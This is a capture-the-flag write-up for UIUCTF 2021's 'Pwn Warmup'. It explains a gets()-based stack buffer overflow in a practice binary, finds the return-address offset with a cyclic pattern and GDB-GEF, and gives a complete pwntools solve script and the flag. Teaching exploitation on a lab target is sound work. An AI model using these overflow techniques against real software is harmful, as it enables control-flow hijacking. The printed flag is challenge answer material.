# Pwn Warmup - 50 pts, 214 solves
> Hmm this time we arent just going to give you the flag like last year... What can you do?!
> 
> nc pwn-warmup.chal.uiuc.tf 1337
> 
> challenge

`Pwn Warmup` was a pwn (binary exploitation) challenge in UIUCTF 2021, where I played with `TeamlessCTF`, placing 12th place overall. Although my team solved this challenge before I got a chance to during the CTF, I wanted to make a writeup for it anyways.

We first decompile the `main` function in Ghidra (Ghidra is a C decompiler developed by the NSA, and can be found at https://ghidra-sre.org/):

```C
void main(void)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("This is SIGPwny stack3, go");
  printf("&give_flag = %p\n",give_flag);
  vulnerable();
  return;
}
```

It seems that the challenge first calls `setvbuf` to help input/output to work in the remote connection, and then prints out the address of the `give_flag` function. Then, the program calls the `vulnerable` function, which (of course) is vulnerable. Let's look at the decompilation:

```C
void vulnerable(void)

{
  char buf [8];
  
  gets(buf);
  return;
}
```

Hmmm... The program calls `gets()` on the `buf` variable. Let's read from the man page of `gets`:

```
DESCRIPTION
       Never use this function.

       gets()  reads  a  line  from  stdin into the buffer pointed to by s until either a terminating newline or EOF,
       which it replaces with a null byte ('\0').  No check for buffer overrun is performed (see BUGS below).
```

In case you didn't notice:

> Never use this function.

OK. So the program is using an insecure function. Why is `gets()` insecure? According to the man page, `gets` reads input from standard input until a newline, and then *writes it to memory*. No check for how much memory is being written to, so we can overwrite whatever we want in nearby memory by giving the program more input than it is prepared to handle. Let's visualize the memory:

```
|        buf[8]        |                       | saved ebp | saved eip |
------------------------------------------------------------------------
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

`buf` is the area we write to, and the saved ebp and saved eip are the places where the program has saved registers for when the program returns to the function from which it was called. If we overwrite it with an address, we can control where the program jumps to after the `vulnerable()` function is done. Luckily for us, the program has provided us with a `give_flag` function that prints out the flag. So our goal is to overwrite the saved eip with the address of give_flag.

Hold up. How did we know how much space in memory there is between `buf` and the saved ebp and eip? Although there are ways to do this in many cases through static analysis, I prefer to use a tool such as GDB to examine the memory as the program runs. I used the GEF extension of GDB (found at https://gef.readthedocs.io/en/master/) to do this. A quick way to find the distance from `buf` to the ebp and eip is to use `pwn cyclic`, which comes with pwntools, to allow for easy analysis through GDB. We can run the command `pwn cyclic 100 -n 4` (note that the -n 4 is because our program is 32-bit, and 4 bytes is 32 bits) to generate a cyclic pattern. The reason we use this cyclic pattern is that if we examine the registers in GDB afterwards, we could determine the offset from the buffer to the registers because each 4-byte section of the cyclic pattern is unique and can be looked up using the `pwn cyclic` program. Let's do this now:

```bash
$ pwn cyclic 100 -n 4
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

We can now paste this into GDB-GEF, which will automatically print the registers when our program segfaults:

```bash
gef➤  r
Starting program: /mnt/c/users/ethan/downloads/CTF-Writeups/UIUCTF 2021/Pwn_Warmup/challenge
This is SIGPwny stack3, go
&give_flag = 0x80485ab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616166 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd128  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x0
$ecx   : 0xf7fb2580  →  0xfbad208b
$edx   : 0xffffd18c  →  0xf7fb2000  →  0x001e6d6c
$esp   : 0xffffd140  →  "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
$ebp   : 0x61616165 ("eaaa"?)
$esi   : 0xf7fb2000  →  0x001e6d6c
$edi   : 0xf7fb2000  →  0x001e6d6c
$eip   : 0x61616166 ("faaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd140│+0x0000: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"    ← $esp
0xffffd144│+0x0004: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
0xffffd148│+0x0008: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0xffffd14c│+0x000c: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffd150│+0x0010: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffd154│+0x0014: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffd158│+0x0018: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffd15c│+0x001c: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616166
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge", stopped 0x61616166 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

There's a lot of information here, but what's important is that we see that eip has been changed to 0x61616166. We can use `pwn cyclic` to look up the offset:

```bash
$ pwn cyclic -l 0x61616166 -n 4
20
```

So there! The offset to the saved eip is 20, and we find that the offset to the saved ebp is 16 by the same process. 

**Sidenote: What are ebp and eip and why are they saved on the stack (memory) right now?**
The CPU of a computer has multiple registers, each able to hold a value. In a 32-bit program, the registers each hold 4 bytes (32 bits). The ebp register stores the base address of the stack while the eip register stores the address of the current instruction the program is executing. When a program calls a function, it must store where to return to after the function is called. So, when a function is called ebp and eip are stored on the stack, and are returned to the registers when `ret` is called. So, if we overwrite the saved eip, we can hijack the control flow of the program because we are changing where the program jumps to after the function is finished.

OK, back to our exploitation. How do we overwrite eip? Let's examine memory again.

Let's say we input `AAAAAAAA` into the program. Then the program writes the input to `buf`:

```
|        buf[8]        |                       | saved ebp | saved eip |
------------------------------------------------------------------------
41 41 41 41 41 41 41 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

The program functions as normal, because we did not give more input that it could take. But what if we inputted more text?

Let's say we inputted `AAAAAAAAAAAAAAAAAAAA` (24 `A`s) into the program. Now our memory looks like this:

```
|        buf[8]        |                       | saved ebp | saved eip |
------------------------------------------------------------------------
41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
```

Our saved eip is now `0x41414141` (note that 0x41 is the hex value of `A` so our `A`s are getting written to the saved eip). This will cause a segmentation fault because the program is trying to jump to the address `0x41414141` but doesn't work because there isn't actually any memory at `0x41414141`. Progress! We crashed the program.

So what if we changed our `0x41414141` with something a little more controlled... Let's say the address of `give_flag`. Luckily, our program prints out the address of `give_flag` when we run it. So, all we need to do is:

- send 20 `A`s to get through `buf` and ebp
- send the address of `give_flag` to overflow eip

Hold on. We can't literally send the numbers that represent the address of `give_flag`, we need to send them in the format that the program expects addresses. We need to send the address as hex, and in *little endian*. This means that we translate our address from hex to ASCII and send it in backwards.

Now, this all seems kind of complicated. But don't fear! We have a trusty python package to do this for us, including formatting the address in little endian and sending those unprintable characters to the server!

We will use the `pwntools` python package, which has all sorts of tools for pwn challenges. We can start a pwntools script:

```python
#!/usr/bin/env python3

from pwn import * # import pwntools

conn = remote("pwn-warmup.chal.uiuc.tf", 1337) # connect to the remote server
``` 

OK! We have a script that will connect to the remote server. Now, we use our program to programatically get the address of `give_flag` that was printed out:

```python
conn.recvuntil("&give_flag = ")
give_flag = int(conn.recvline(), 0)
```

We recieve the input up to `&give_flag = `, then we recieve the rest of the line, which is simply the address in hex. We convert this to an `int`.

Now, it's time to build our payload. We first need 20 `A`s and then the address of `give_flag`. Remember the little endian stuff? Pwntools has a function, `p32`, that will format an address to little endian for 32-bit programs such as this one. (it uses `struct.pack` behind the scenes if you want to figure out what it's doing)

```python
payload = b"A" * 20 # 20 As
payload += p32(give_flag) # format our address in little endian
```

So now we have a payload that will overwrite the saved eip (the return address) with the address of `give_flag`. We send it with pwntools:

```python
conn.sendline(payload) # send the payload to the server
conn.stream() # print the output
```

And with that, we get the flag printed out for us.

Flag: `uiuctf{k3b0ard_sp@m_do3snT_w0rk_anYm0r3}`

Full solve script:

```python
#!/usr/bin/env python3

from pwn import *

conn = remote("pwn-warmup.chal.uiuc.tf", 1337)

conn.recvuntil("&give_flag = ")
give_flag = int(conn.recvline(), 0)

payload = b"A"*20
payload += p32(give_flag)

conn.sendline(payload)

conn.stream()
```
